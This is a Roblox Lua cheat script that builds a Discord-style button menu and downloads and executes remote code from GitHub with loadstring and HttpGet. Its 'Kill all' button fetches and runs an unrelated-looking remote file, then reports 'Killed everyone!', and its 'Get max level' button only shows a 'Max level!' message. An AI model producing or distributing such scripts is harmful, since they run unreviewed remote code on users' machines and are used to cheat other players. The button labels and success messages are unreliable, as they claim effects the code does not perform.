local DiscordLib =
    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()

local win = DiscordLib:Window("discord library")

local serv = win:Server("Preview", "")

local btns = serv:Channel("Buttons")

btns:Button(
    "Kill all",
    function() print(loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))())
        DiscordLib:Notification("Notification", "Killed everyone!", "Okay!")
    end
)

btns:Seperator()

btns:Button(
    "Get max level",
    function()
        DiscordLib:Notification("Notification", "Max level!", "Okay!")
    end
)



serv:Channel("by dawid#7205")

win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
